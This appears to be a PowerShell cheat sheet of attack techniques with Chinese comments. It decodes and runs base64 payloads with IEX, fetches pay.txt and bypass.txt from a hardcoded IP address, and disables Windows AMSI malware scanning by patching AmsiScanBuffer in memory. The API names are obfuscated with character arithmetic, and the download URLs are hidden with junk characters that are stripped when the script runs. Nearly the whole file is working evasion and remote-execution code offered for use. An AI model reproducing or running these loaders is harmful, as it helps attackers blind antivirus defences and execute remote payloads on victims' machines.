#本地加载powershell进程
#base64密文储存进字符串
$Encryption = @'   '@   

#base64解密公式
解密后的变量 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(加密后的变量))
$Decryption = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Encryption))
#IEX 执行字符串
IEX $Decryption

/*-------------------------------------------------------------------------------------*/

#通过WebRequest的方式远程加载
$webreq = [System.Net.WebRequest]::Create('http://10.212.202.188:8000/pay.txt')
$resp=$webreq.GetResponse()
$respstream=$resp.GetResponseStream()
$reader=[System.IO.StreamReader]::new($respstream)
$content=$reader.ReadToEnd()

#导入windowsAPI
$clmtz = @"
using System;
using System.Runtime.InteropServices;
public class clmtz {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr sohbve, uint flNewProtect, out uint lpflOldProtect);
}
"@
#通过修补AmsiScanBuffer的功能来阻断amsi.dll的扫描进程
Add-Type $clmtz

$iopkxhe = [clmtz]::LoadLibrary("$(('àm'+'sí'+'.d'+'ll').NOrmALize([cHAR]([BytE]0x46)+[CHAR](111+51-51)+[cHAR](114)+[ChAr]([bYTE]0x6d)+[CHAr]([byTE]0x44)) -replace [cHaR]([ByTe]0x5c)+[ChAR](112)+[cHAR](123)+[CHaR]([byTe]0x4d)+[CHaR]([bYte]0x6e)+[chAr](125+88-88))")
$nyrkaj = [clmtz]::GetProcAddress($iopkxhe, "$([ChAR](65*24/24)+[char](109+49-49)+[CHar](115+74-74)+[chaR](105+91-91)+[ChAR](83*81/81)+[cHaR]([bYtE]0x63)+[CHar](87+10)+[chaR]([BytE]0x6e)+[CHAr](66+13-13)+[cHar](115+2)+[Char](102)+[CHAr](91+11)+[ChAr](57+44)+[CHAr](82+32))")
$p = 0
[clmtz]::VirtualProtect($nyrkaj, [uint32]5, 0x40, [ref]$p)
$srpa = "0xB8"
$ztcq = "0x57"
$vgha = "0x00"
$vujk = "0x07"
$peii = "0x80"
$bgxf = "0xC3"
$pjlbb = [Byte[]] ($srpa,$ztcq,$vgha,$vujk,+$peii,+$bgxf)
[System.Runtime.InteropServices.Marshal]::Copy($pjlbb, 0, $nyrkaj, 6)
IEX($content)

/*-----------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

##远程加载方式
#1.
IEX([Net.Webclient]::new().DownloadString("0.0.0.0/pay.txt")
IEX([Net.Webclient]::new().DownloadString("h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@@@@:80@@@@@00/bypas%%%s.tx%%%t".Replace('@@@@@','').Replace('%%%','')))
#2.
IEX ((new-object net.webclient).downloadstring("0.0.0.0/pay.txt")
IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()2.202.188@@@@@:8000/byp**************ass.tx**************t".Replace('@@@@@','').Replace('@!#$%^&*()','').Replace('**************',''))
